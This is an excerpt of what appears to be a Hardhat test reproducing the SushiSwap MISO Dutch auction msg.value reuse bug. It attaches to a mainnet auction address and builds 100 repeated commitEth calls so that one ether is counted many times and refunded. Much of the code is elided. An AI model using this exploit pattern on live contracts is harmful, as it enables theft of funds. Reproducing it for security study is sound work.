...
describe('SushiSwap Miso: msg.value reused vulnerability', async function () {
  ...
  before(async function () {
    ...
    auction = (await ethers.getContractFactory('contracts/MsgValueReuse/DutchAuction.sol:DutchAuction')).attach(mainnetDuctchAuctionAddress) as DutchAuction
  ...
  it('Attack:only send 1 ether and get refunded much more ether', async function () {
    ...
    const commit = await auction.calculateCommitment(toWei('1')) 

    // get refunded whole 1 ether
    const callData = new Array(100).fill(auction.interface.encodeFunctionData("commitEth", [attacker.address, true]))
